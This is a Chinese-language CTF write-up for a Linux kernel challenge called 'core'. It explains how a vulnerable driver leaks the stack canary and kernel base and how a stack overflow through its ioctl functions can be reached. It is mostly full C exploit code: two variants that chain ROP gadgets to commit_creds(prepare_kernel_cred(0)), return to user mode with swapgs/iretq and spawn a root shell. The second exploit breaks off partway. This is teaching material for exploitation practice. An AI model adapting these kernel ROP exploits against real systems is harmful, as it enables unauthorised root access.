+<pre><code class="lang-shell">cat /tmp/kallsyms | grep startup_64
+</code></pre>
+<p><img src="2.png" alt=""></p>
+<p>2.</p>
+<pre><code class="lang-shell">insmod /core.ko
+</code></pre>
+<p>&#x52A0;&#x8F7D;&#x9A71;&#x52A8;&#x547D;&#x4EE4;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x5B58;&#x5728;&#x6F0F;&#x6D1E;&#x7684;&#x9A71;&#x52A8;</p>
+<p>&#x5728;root&#x6743;&#x9650;&#x4E0B;lsmod&#x53EF;&#x4EE5;&#x67E5;&#x770B;&#x9A71;&#x52A8;&#x52A0;&#x8F7D;&#x57FA;&#x5730;&#x5740;</p>
+<p><img src="3.png" alt=""></p>
+<p>3.</p>
+<pre><code class="lang-shell">setsid /bin/cttyhack setuidgid 1000 /bin/sh
+</code></pre>
+<p>&#x8BBE;&#x7F6E;&#x7528;&#x6237;&#xFF0C;&#x5728;&#x8C03;&#x8BD5;&#x8FC7;&#x7A0B;&#x4E2D;&#x901A;&#x5E38;&#x76F4;&#x63A5;setuid&#x4E3A;0&#xFF0C;&#x65B9;&#x4FBF;&#x67E5;&#x770B;&#x4E00;&#x4E9B;&#x57FA;&#x5730;&#x5740;</p>
+<p>&#x542F;&#x52A8;&#x73AF;&#x5883;&#x524D;&#x770B;&#x770B;&#x542F;&#x52A8;&#x811A;&#x672C;</p>
+<p>boot.sh</p>
+<pre><code class="lang-shell">qemu-system-x86_64 \
+-m 256M \
+-kernel ./bzImage \
+-initrd  ./core.cpio \
+-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr useradd&quot; \
+-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
+-nographic  \
+-gdb tcp::1234\
+</code></pre>
+<p>&#x901A;&#x5E38;&#x4F1A;&#x6CE8;&#x610F;&#x4E00;&#x4E0B;-append&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x67E5;&#x770B;&#x4FDD;&#x62A4;&#x60C5;&#x51B5;&#xFF0C;&#x8FD9;&#x9053;&#x9898;&#x6CA1;&#x5F00;smep</p>
+<h4 id="&#x9898;&#x76EE;&#x5206;&#x6790;">&#x9898;&#x76EE;&#x5206;&#x6790;</h4>
+<p>&#x8BE6;&#x7EC6;&#x7684;&#x8FC7;&#x7A0B;&#x8FD8;&#x662F;&#x770B;wiki&#x5427;...&#x6211;&#x5199;&#x7684;&#x592A;&#x70C2;&#x4E86;</p>
+<p><a href="https://ctf-wiki.org/pwn/linux/kernel/kernel_rop/" target="_blank">https://ctf-wiki.org/pwn/linux/kernel/kernel_rop/</a></p>
+<p>&#x5927;&#x81F4;&#x601D;&#x8DEF;&#x5C31;&#x662F;&#x901A;&#x8FC7; core_read()&#x51FD;&#x6570;&#x6765;&#x6CC4;&#x9732;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x654F;&#x611F;&#x4FE1;&#x606F;&#xFF08;canary&#xFF0C;&#x9A71;&#x52A8;&#x52A0;&#x8F7D;&#x57FA;&#x5730;&#x5740;&#xFF0C;vmlinux&#x52A0;&#x8F7D;&#x57FA;&#x5730;&#x5740;&#xFF09;&#xFF08;&#x8FD9;&#x91CC;vmlinux_base&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x6253;&#x5F00;/tmp/kallsyms&#x6765;&#x76F4;&#x63A5;&#x8BFB;&#x53D6;&#xFF09;&#xFF0C;&#x7136;&#x540E;&#x901A;&#x8FC7; core_write() &#x548C; core_copy_func() &#x6765;&#x5B9E;&#x73B0;&#x4E00;&#x4E2A;&#x6808;&#x6EA2;&#x51FA;&#x3002;</p>
+<p>&#x7ED9;&#x51FA;&#x6700;&#x7EC8;exp&#x4E4B;&#x524D;&#x5148;&#x7ED9;&#x51E0;&#x4E2A;&#x5E38;&#x7528;&#x7684;&#x65B9;&#x6CD5;&#x3002;</p>
+<ul>
+<li><p>&#x5F53;&#x4ECE;&#x5185;&#x6838;&#x6001;&#x56DE;&#x5230;&#x7528;&#x6237;&#x6001;&#x65F6;&#x6D41;&#x7A0B;&#x5982;&#x4E0B;&#xFF1A;</p>
+</li>
+<li><p>&#x901A;&#x8FC7; <code>swapgs</code> &#x6062;&#x590D; GS &#x503C;</p>
+</li>
+<li>&#x901A;&#x8FC7; <code>sysretq</code> &#x6216;&#x8005; <code>iretq</code> &#x6062;&#x590D;&#x5230;&#x7528;&#x6237;&#x63A7;&#x4EF6;&#x7EE7;&#x7EED;&#x6267;&#x884C;&#x3002;&#x5982;&#x679C;&#x4F7F;&#x7528; <code>iretq</code> &#x8FD8;&#x9700;&#x8981;&#x7ED9;&#x51FA;&#x7528;&#x6237;&#x7A7A;&#x95F4;&#x7684;&#x4E00;&#x4E9B;&#x4FE1;&#x606F;&#xFF08;CS, eflags/rflags, esp/rsp &#x7B49;&#xFF09;</li>
+</ul>
+<p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x8BB0;&#x5F55;&#x5728;&#x7528;&#x6237;&#x6001;&#x4E0B;&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x901A;&#x5E38;&#x7528;&#x4E00;&#x6BB5;&#x6C47;&#x7F16;&#x4EE3;&#x7801;&#x5B9E;&#x73B0;</p>
+<pre><code class="lang-c"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> user_cs, user_ss, user_eflags,user_sp;
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">save_stats</span><span class="hljs-params">()</span> </span>{
+    <span class="hljs-keyword">asm</span>(
+        <span class="hljs-string">&quot;movq %%cs, %0\n&quot;</span>
+        <span class="hljs-string">&quot;movq %%ss, %1\n&quot;</span>
+        <span class="hljs-string">&quot;movq %%rsp, %3\n&quot;</span>
+        <span class="hljs-string">&quot;pushfq\n&quot;</span>
+        <span class="hljs-string">&quot;popq %2\n&quot;</span>
+        :<span class="hljs-string">&quot;=r&quot;</span>(user_cs), <span class="hljs-string">&quot;=r&quot;</span>(user_ss), <span class="hljs-string">&quot;=r&quot;</span>(user_eflags),<span class="hljs-string">&quot;=r&quot;</span>(user_sp)
+         :
+         : <span class="hljs-string">&quot;memory&quot;</span>
+     );
+}
+</code></pre>
+<ul>
+<li>vmlinux&#x4E2D;&#x7684;&#x51FD;&#x6570;&#x504F;&#x79FB;&#x53EF;&#x4EE5;&#x7528;&#x811A;&#x672C;&#x5B9E;&#x73B0;</li>
+</ul>
+<pre><code class="lang-python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+elf = ELF(<span class="hljs-string">&apos;./core/vmlinux&apos;</span>)
+<span class="hljs-keyword">print</span> <span class="hljs-string">&quot;commit_creds&quot;</span>,hex(elf.symbols[<span class="hljs-string">&apos;commit_creds&apos;</span>]<span class="hljs-number">-0xffffffff81000000</span>)
+<span class="hljs-keyword">print</span> <span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>,hex(elf.symbols[<span class="hljs-string">&apos;prepare_kernel_cred&apos;</span>]<span class="hljs-number">-0xffffffff81000000</span>)
+</code></pre>
+<ul>
+<li>&#x5047;&#x5982;&#x7A0B;&#x5E8F;smep&#x4FDD;&#x62A4;&#x6CA1;&#x5F00;&#xFF0C;&#x90A3;&#x4E48;&#x5185;&#x6838;&#x6001;&#x4E0B;&#x4E5F;&#x80FD;&#x6267;&#x884C;&#x7528;&#x6237;&#x7A7A;&#x95F4;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5728;exp&#x4E2D;&#x6DFB;&#x52A0;&#x6267;&#x884C; commit_creds(prepare_kernel_cred(0)) &#x7684;&#x51FD;&#x6570;&#xFF08;&#x8FD9;&#x4E48;&#x505A;&#x7684;&#x539F;&#x56E0;&#x662F;&#x53EF;&#x4EE5;&#x5C11;&#x6784;&#x9020;&#x4E00;&#x6BB5;gadget&#xFF0C;&#x4EE3;&#x7801;&#x4F1A;&#x77ED;&#x4E00;&#x70B9;&#x800C;&#x5DF2;&#xFF09;&#x3002;</li>
+</ul>
+<p>smep&#x4FDD;&#x62A4;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4ECE;&#x542F;&#x52A8;qemu&#x7684;&#x811A;&#x672C;boot.sh&#x4E2D;&#x67E5;&#x770B;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; </p>
+<pre><code class="lang-shell">cat /proc/cpuinfo | grep smep
+</code></pre>
+<p>&#x6765;&#x67E5;&#x770B;&#xFF0C;&#x5047;&#x5982;&#x6CA1;&#x6709;&#x56DE;&#x663E;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x662F;&#x672A;&#x5F00;&#x542F;</p>
+<p>&#x7528;&#x6237;&#x6001;&#x4E0B;&#x6784;&#x9020;commit_creds(prepare_kernel_cred(0))&#xFF0C;&#x524D;&#x63D0;&#x662F;&#x4E24;&#x4E2A;&#x51FD;&#x6570;&#x7684;&#x5730;&#x5740;&#x5DF2;&#x7ECF;&#x77E5;&#x9053;&#x3002;</p>
+<pre><code class="lang-c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_root</span><span class="hljs-params">()</span>
+</span>{
+    <span class="hljs-keyword">char</span>* (*pkc)(<span class="hljs-keyword">int</span>) = prepare_kernel_cred;
+    <span class="hljs-keyword">void</span> (*cc)(<span class="hljs-keyword">char</span>*) = commit_creds;
+    (*cc)((*pkc)(<span class="hljs-number">0</span>));
+    <span class="hljs-comment">/* puts(&quot;[*] root now.&quot;); */</span>
+}
+</code></pre>
+<ul>
+<li><code>swapgs</code> &amp; <code>iretq</code> </li>
+</ul>
+<p>&#x8FD9;&#x4E24;&#x4E2A;&#x7247;&#x6BB5;&#x90FD;&#x53EF;&#x4EE5;&#x5728;vmlinux&#x4E2D;&#x627E;&#x5230;&#xFF0C;&#x5F53;&#x7136;&#x5047;&#x5982;&#x9A71;&#x52A8;&#x91CC;&#x9762;&#x6709;&#x8FD9;&#x4E9B;&#x7247;&#x6BB5;&#x5E76;&#x4E14;&#x57FA;&#x5730;&#x5740;&#x5DF2;&#x7ECF;&#x6CC4;&#x9732;&#x90A3;&#x4E48;&#x4E5F;&#x662F;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x7684;&#x3002;&#x4E0D;&#x8FC7;&#x7528;ropper&#x7684;&#x65F6;&#x5019;&#x8981;&#x6CE8;&#x610F;&#x865A;&#x62DF;&#x673A;&#x5185;&#x5B58;&#x548C;&#x5904;&#x7406;&#x5668;&#x5185;&#x6838;&#x6570;&#x91CF;&#x8BBE;&#x5927;&#x4E00;&#x70B9;&#xFF0C;&#x8981;&#x4E0D;&#x7136;&#x4F1A;&#x8DD1;&#x7684;&#x5F88;&#x6162;&#x800C;&#x4E14;&#x8FD8;&#x4E0D;&#x4E00;&#x5B9A;&#x8DD1;&#x7684;&#x51FA;&#x6765;&#x3002;</p>
+<p><img src="4.png" alt=""></p>
+<p><img src="5.png" alt=""></p>
+<ul>
+<li>exp&#x7F16;&#x8BD1;</li>
+</ul>
+<p>&#x7531;&#x4E8E;&#x5185;&#x6838;&#x4E0B;&#x662F;&#x6CA1;&#x6709;libc&#x7684;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x628A;exp&#x7F16;&#x8BD1;&#x6210;&#x9759;&#x6001;</p>
+<pre><code class="lang-c">gcc -o <span class="hljs-built_in">exp</span> <span class="hljs-built_in">exp</span>.c -<span class="hljs-keyword">static</span>
+</code></pre>
+<p>&#x4E86;&#x89E3;&#x4E86;&#x4E0A;&#x9762;&#x8FD9;&#x4E9B;&#x5185;&#x5BB9;&#x90A3;&#x4E48;exp&#x786E;&#x5B9E;&#x5DF2;&#x7ECF;&#x76F8;&#x5BF9;&#x597D;&#x5199;&#x4E86;&#xFF0C;&#x56E0;&#x4E3A;&#x5185;&#x6838;&#x6001;&#x4E0B;&#x7684;rop&#x548C;&#x7528;&#x6237;&#x6001;&#x4E0B;&#x7684;rop&#x5176;&#x5B9E;&#x65B9;&#x6CD5;&#x90FD;&#x662F;&#x4E00;&#x6837;&#x7684;&#xFF0C;&#x800C;&#x4E14;gadgets&#x4F17;&#x591A;&#x603B;&#x6709;&#x4F60;&#x559C;&#x6B22;&#x7684;&#x3002;&#x3002;&#x3002;&#x8FD9;&#x91CC;&#x5934;&#x6587;&#x4EF6;...&#x80FD;&#x52A0;&#x7684;&#x5C31;&#x52A0;&#x5427;&#xFF0C;&#x53CD;&#x6B63;&#x52A0;&#x591A;&#x53C8;&#x4E0D;&#x51FA;&#x4E8B;&#x3002;</p>
+<p>&#x4E0B;&#x9762;&#x5206;&#x522B;&#x7ED9;&#x51FA;&#x4E24;&#x79CD;exp</p>
+<p>&#x6CE8;&#xFF1A;&#x8FD9;&#x91CC;vmlinux&#x6CC4;&#x9732;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x6808;&#x6CC4;&#x9732;&#xFF0C;&#x4F46;&#x65E2;&#x7136;&#x542F;&#x52A8;&#x811A;&#x672C;init&#x91CC;&#x6709;tmp/kallsyms&#x90A3;&#x4E48;&#x6211;&#x8FD9;&#x91CC;exp&#x5C31;&#x76F4;&#x63A5;&#x53BB;&#x8BFB;&#x53D6;&#x5C31;&#x5B8C;&#x4E8B;&#x3002;</p>
+<p>1.&#x6267;&#x884C;&#x5185;&#x6838;&#x4E2D;&#x7684;commit_creds(prepare_kernel_cred(0)) &#xFF08;&#x53EF;&#x4EE5;&#x65E0;&#x89C6;smep&#x4FDD;&#x62A4;&#xFF09;</p>
+<p>&#x7136;&#x540E;&#x8FD4;&#x56DE;&#x7528;&#x6237;&#x6001;&#x540E;&#x6267;&#x884C;system(&quot;/bin/sh&quot;)</p>
+<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/wait.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span>
+
+<span class="hljs-keyword">size_t</span> vmlinux_base=<span class="hljs-number">0</span>;
+<span class="hljs-keyword">size_t</span> module_base;
+<span class="hljs-keyword">size_t</span> canary;
+<span class="hljs-keyword">size_t</span> commit_creds = <span class="hljs-number">0x9c8e0</span>;
+<span class="hljs-keyword">size_t</span> prepare_kernel_cred = <span class="hljs-number">0x9cce0</span>;
+
+<span class="hljs-keyword">size_t</span> prdi = <span class="hljs-number">0xb2f</span>; <span class="hljs-comment">//pop rdi; ret;</span>
+<span class="hljs-keyword">size_t</span> prdx = <span class="hljs-number">0xa0f49</span>;<span class="hljs-comment">//pop rdx; ret;</span>
+<span class="hljs-keyword">size_t</span> prcx = <span class="hljs-number">0x21e53</span>;<span class="hljs-comment">//pop rcx; ret;</span>
+<span class="hljs-keyword">size_t</span> mrdi_rax_call_rdx= <span class="hljs-number">0x1aa6a</span>;<span class="hljs-comment">//mov rdi, rax;call rdx;</span>
+<span class="hljs-keyword">size_t</span> swapgs = <span class="hljs-number">0xa012da</span>;<span class="hljs-comment">//swapgs; popfq; ret;</span>
+<span class="hljs-keyword">size_t</span> iret=<span class="hljs-number">0x50ac2</span>;<span class="hljs-comment">// iretq; ret;</span>
+
+<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> user_cs, user_ss, user_eflags,user_sp;
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">save_stats</span><span class="hljs-params">()</span> </span>{
+    <span class="hljs-keyword">asm</span>(
+        <span class="hljs-string">&quot;movq %%cs, %0\n&quot;</span>
+        <span class="hljs-string">&quot;movq %%ss, %1\n&quot;</span>
+        <span class="hljs-string">&quot;movq %%rsp, %3\n&quot;</span>
+        <span class="hljs-string">&quot;pushfq\n&quot;</span>
+        <span class="hljs-string">&quot;popq %2\n&quot;</span>
+        :<span class="hljs-string">&quot;=r&quot;</span>(user_cs), <span class="hljs-string">&quot;=r&quot;</span>(user_ss), <span class="hljs-string">&quot;=r&quot;</span>(user_eflags),<span class="hljs-string">&quot;=r&quot;</span>(user_sp)
+         :
+         : <span class="hljs-string">&quot;memory&quot;</span>
+     );
+}
+
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setoff</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd,<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> size)</span></span>{
+    ioctl(fd,<span class="hljs-number">0x6677889C</span>,size);
+}
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">core_read</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd,<span class="hljs-keyword">char</span> *buf)</span></span>{
+    ioctl(fd,<span class="hljs-number">0x6677889b</span>,buf);
+}
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">core_copy_func</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd,<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> size)</span></span>{
+    ioctl(fd,<span class="hljs-number">0x6677889a</span>,size);
+}
+
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_shell</span><span class="hljs-params">()</span></span>{
+    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);
+}
+
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_vmlinux_base</span><span class="hljs-params">()</span></span>{
+    FILE *fd = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);
+    <span class="hljs-keyword">if</span>(fd&lt;<span class="hljs-number">0</span>){
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]openfile /tmp/kallsyms error!\n&quot;</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+    }
+    <span class="hljs-keyword">char</span> tmp[<span class="hljs-number">0x50</span>];
+    <span class="hljs-keyword">while</span>(fgets(tmp,<span class="hljs-number">0x40</span>,fd)!=<span class="hljs-literal">NULL</span>){
+        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(tmp,<span class="hljs-string">&quot;startup_64&quot;</span>)==<span class="hljs-literal">NULL</span>){
+            <span class="hljs-keyword">continue</span>;
+        }
+        <span class="hljs-keyword">char</span> a[<span class="hljs-number">0x20</span>];
+        <span class="hljs-built_in">memset</span>(a,<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>);
+        <span class="hljs-built_in">strncpy</span>(a,tmp,<span class="hljs-number">0x10</span>);
+        <span class="hljs-built_in">sscanf</span>(a,<span class="hljs-string">&quot;%llx&quot;</span>,&amp;vmlinux_base);
+        <span class="hljs-keyword">break</span>;
+    }
+    prdi += vmlinux_base;
+    prcx += vmlinux_base;
+    prdx += vmlinux_base;
+    mrdi_rax_call_rdx += vmlinux_base;
+    swapgs += vmlinux_base;
+    iret += vmlinux_base;
+    prepare_kernel_cred += vmlinux_base;
+    commit_creds += vmlinux_base;
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] vmlinux_base===&gt;%p\n&quot;</span>,vmlinux_base);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] commit_creds===&gt;%p\n&quot;</span>,commit_creds);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] prepare_kernel_cred===&gt;%p\n&quot;</span>,prepare_kernel_cred);
+    fclose(fd);
+}
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{
+    save_stats();
+    get_vmlinux_base();
+    <span class="hljs-keyword">int</span> fd;
+    fd = open(<span class="hljs-string">&quot;/proc/core&quot;</span>,O_RDWR);
+    <span class="hljs-keyword">if</span>(fd &lt; <span class="hljs-number">0</span> ){
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Open /proc/core error!\n&quot;</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+    }
+    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x100</span>];
+    <span class="hljs-keyword">size_t</span> tmps[<span class="hljs-number">0x10</span>];
+    setoff(fd,<span class="hljs-number">0x40</span>);
+    core_read(fd,buf);
+    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i&lt;<span class="hljs-number">8</span>;i++){
+        tmps[i] = *(<span class="hljs-keyword">size_t</span> *)(&amp;buf[i*<span class="hljs-number">8</span>]);
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] %p\n&quot;</span>,i,tmps[i]);
+    }
+    canary = tmps[<span class="hljs-number">0</span>];
+    module_base = tmps[<span class="hljs-number">2</span>]<span class="hljs-number">-0x19b</span>;
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] canary===&gt;%p\n&quot;</span>,canary);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] module_base===&gt;%p\n&quot;</span>,module_base);
+    <span class="hljs-keyword">int</span> i = <span class="hljs-number">8</span>;
+    <span class="hljs-keyword">size_t</span> rop[<span class="hljs-number">0x20</span>];
+    rop[i++] = canary;
+    rop[i++] = <span class="hljs-number">0</span>;
+    rop[i++] = prdi;
+    rop[i++] = <span class="hljs-number">0</span> ; 
+    rop[i++] = prepare_kernel_cred;
+    rop[i++] = prdx;<span class="hljs-comment">//pop rdx; ret;</span>
+    rop[i++] = prcx;<span class="hljs-comment">//pop rcx; ret</span>
+    rop[i++] = mrdi_rax_call_rdx;<span class="hljs-comment">//mov rdi, rax;call rdx;</span>
+    rop[i++] = commit_creds;
+    rop[i++] = swapgs;<span class="hljs-comment">//swapgs; popfq; ret;</span>
+    rop[i++] = <span class="hljs-number">0</span>;
+    rop[i++] = iret;<span class="hljs-comment">// iretq; ret;</span>
+    rop[i++] = (<span class="hljs-keyword">size_t</span>)get_shell;
+    rop[i++] = user_cs;
+    rop[i++] = user_eflags;
+    rop[i++] = user_sp;
+    rop[i++] = user_ss;
+    write(fd,rop,<span class="hljs-number">0x100</span>);
+    core_copy_func(fd,<span class="hljs-number">0xf000000000000000</span>+<span class="hljs-number">0x100</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+<p>2.&#x6267;&#x884C;&#x7528;&#x6237;&#x4EE3;&#x7801;&#x4E2D;&#x7684;commit_creds(prepare_kernel_cred(0)) &#xFF08;ret2usr&#xFF09;</p>
+<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/wait.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span>
+
+<span class="hljs-keyword">size_t</span> vmlinux_base=<span class="hljs-number">0</span>;
+<span class="hljs-keyword">size_t</span> module_base;
+<span class="hljs-keyword">size_t</span> canary;
+<span class="hljs-keyword">size_t</span> commit_creds = <span class="hljs-number">0x9c8e0</span>;
+<span class="hljs-keyword">size_t</span> prepare_kernel_cred = <span class="hljs-number">0x9cce0</span>;
+
+<span class="hljs-keyword">size_t</span> prdi = <span class="hljs-number">0xb2f</span>; <span class="hljs-comment">//pop rdi; ret;</span>
+<span class="hljs-keyword">size_t</span> prdx = <span class="hljs-number">0xa0f49</span>;<span class="hljs-comment">//pop rdx; ret;</span>
+<span class="hljs-keyword">size_t</span> prcx = <span class="hljs-number">0x21e53</span>;<span class="hljs-comment">//pop rcx; ret;</span>
+<span class="hljs-keyword">size_t</span> mrdi_rax_call_rdx= <span class="hljs-number">0x1aa6a</span>;<span class="hljs-comment">//mov rdi, rax;call rdx;</span>
+<span class="hljs-keyword">size_t</span> swapgs = <span class="hljs-number">0xa012da</span>;<span class="hljs-comment">//swapgs; popfq; ret;</span>
+<span class="hljs-keyword">size_t</span> iret=<span class="hljs-number">0x50ac2</span>;<span class="hljs-comment">// iretq; ret;</span>
+
+<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> user_cs, user_ss, user_eflags,user_sp;
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">save_stats</span><span class="hljs-params">()</span> </span>{
+    <span class="hljs-keyword">asm</span>(
+        <span class="hljs-string">&quot;movq %%cs, %0\n&quot;</span>
+        <span class="hljs-string">&quot;movq %%ss, %1\n&quot;</span>
+        <span class="hljs-string">&quot;movq %%rsp, %3\n&quot;</span>
+        <span class="hljs-string">&quot;pushfq\n&quot;</span>
+        <span class="hljs-string">&quot;popq %2\n&quot;</span>
+        :<span class="hljs-string">&quot;=r&quot;</span>(user_cs), <span class="hljs-string">&quot;=r&quot;</span>(user_ss), <span class="hljs-string">&quot;=r&quot;</span>(user_eflags),<span class="hljs-string">&quot;=r&quot;</span>(user_sp)
+         :
+         : <span class="hljs-string">&quot;memory&quot;</span>
+     );
+}
+
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setoff</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd,<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> size)</span></span>{
+    ioctl(fd,<span class="hljs-number">0x6677889C</span>,size);
+}
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">core_read</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd,<span class="hljs-keyword">char</span> *buf)</span></span>{
+    ioctl(fd,<span class="hljs-number">0x6677889b</span>,buf);
+}
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">core_copy_func</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd,<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> size)</span></span>{
+    ioctl(fd,<span class="hljs-number">0x6677889a</span>,size);
+}
+
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_shell</span><span class="hljs-params">()</span></span>{
+    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);
+}
+
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_vmlinux_base</span><span class="hljs-params">()</span></span>{
+    FILE *fd = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);
+    <span class="hljs-keyword">if</span>(fd&lt;<span class="hljs-number">0</span>){
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]openfile /tmp/kallsyms error!\n&quot;</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+    }
+    <span class="hljs-keyword">char</span> tmp[<span class="hljs-number">0x50</span>];
+    <span class="hljs-keyword">while</span>(fgets(tmp,<span class="hljs-number">0x40</span>,fd)!=<span class="hljs-literal">NULL</span>){
+        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(tmp,<span class="hljs-string">&quot;startup_64&quot;</span>)==<span class="hljs-literal">NULL</span>){
+            <span class="hljs-keyword">continue</span>;
+        }
+        <span class="hljs-keyword">char</span> a[<span class="hljs-number">0x20</span>];
+        <span class="hljs-built_in">memset</span>(a,<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>);
+        <span class="hljs-built_in">strncpy</span>(a,tmp,<span class="hljs-number">0x10</span>);
+        <span class="hljs-built_in">sscanf</span>(a,<span class="hljs-string">&quot;%llx&quot;</span>,&amp;vmlinux_base);
+        <span class="hljs-keyword">break</span>;
+    }
+    prdi += vmlinux_base;
+    prcx += vmlinux_base;
+    prdx += vmlinux_base;
+    mrdi_rax_call_rdx += vmlinux_base;
+    swapgs += vmlinux_base;
+    iret += vmlinux_base;
+    prepare_kernel_cred += vmlinux_base;
+    commit_creds += vmlinux_base;
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] vmlinux_base===&gt;%p\n&quot;</span>,vmlinux_base);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] commit_creds===&gt;%p\n&quot;</span>,commit_creds);
